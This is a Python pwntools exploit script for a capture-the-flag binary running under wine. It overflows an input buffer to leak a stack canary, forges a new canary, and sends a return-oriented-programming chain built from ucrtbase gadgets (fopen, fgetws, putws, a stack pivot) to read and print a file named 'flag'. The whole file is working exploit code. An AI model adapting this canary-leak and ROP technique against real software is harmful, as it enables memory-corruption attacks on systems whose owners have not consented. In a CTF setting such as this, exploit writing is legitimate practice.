from pwn import *
import sys

context.arch = "amd64"
url = sys.argv[1].split(":")

def conn():
    if args.LOCAL:
        return process(["wine", "./chall.exe"], stdin=PIPE, stdout=PIPE)
    return remote(url[0], int(url[1]))

def main():
    r = conn()

    r.recvuntil(b"Enter your phrase:")

    r.sendline(b"A" * 254)

    r.recvuntil(b"~\r\n\r\n")
    
    r.recvuntil(b"A" * 254)
    canary_bin = r.recv(6)

    canary_leak = u64(canary_bin.ljust(8, b"\x00"))
    # log.info(f"Leaked canary: {hex(canary_leak)}")

    canary_base = canary_leak ^ 0x7ffffe1ffc90

    r.recvuntil(b"Enter the path to save the art:")

    UCRTBASE = 0x6ffffea30000


    FOPEN = UCRTBASE + 0x54240
    FGETWS = UCRTBASE + 0x51C10
    PUTWS = UCRTBASE + 0x34290

    POP_RSP = UCRTBASE + 0x19321
    POP_RDX = UCRTBASE + 0x1df46
    POP_RCX = UCRTBASE + 0x17fa0
    ADD_RCX_RAX_TOUCH_RDX_RET = UCRTBASE + 0x19c2b 
    MOV_R8_RCX = UCRTBASE + 0x3236d

    BUFFER_BASE = 0x7ffffe1ffc90 - 0x140 + 0x30
    DUMP_ADDR = BUFFER_BASE - 0x1000

    NEW_CANARY = canary_base ^ (0x7ffffe1ffc90 - 0x140)

    PAYLOAD = flat({
        0: POP_RCX,
        8: BUFFER_BASE + 152 + 0x48,
        16: POP_RDX,
        24: BUFFER_BASE + 160 + 0x48,
        32: FOPEN,
        40: POP_RDX,
        48: BUFFER_BASE,
        56: POP_RCX,
        64: 0,
        72: ADD_RCX_RAX_TOUCH_RDX_RET,
        80: MOV_R8_RCX,
        88+0x48: POP_RCX,
        96+0x48: DUMP_ADDR,
        104+0x48: POP_RDX,
        112+0x48: 0x100,
        120+0x48: FGETWS,
        128+0x48: POP_RCX,
        136+0x48: DUMP_ADDR,
        144+0x48: PUTWS,
        152+0x48: b"flag\x00",
        160+0x48: b"r\x00",
        0x100: NEW_CANARY,
        0x108: POP_RSP,
        0x110: BUFFER_BASE
    })

    assert b"\x0a" not in PAYLOAD, "Newline detected in payload!"
    assert b"\x1a" not in PAYLOAD, "0x1a detected in payload!"
    assert len(PAYLOAD) > 0x108

    r.sendline(PAYLOAD)
    r.recvuntil(b"TRX{")
    print("TRX{" + r.recvuntil(b"}").decode())


if __name__ == "__main__":
    main()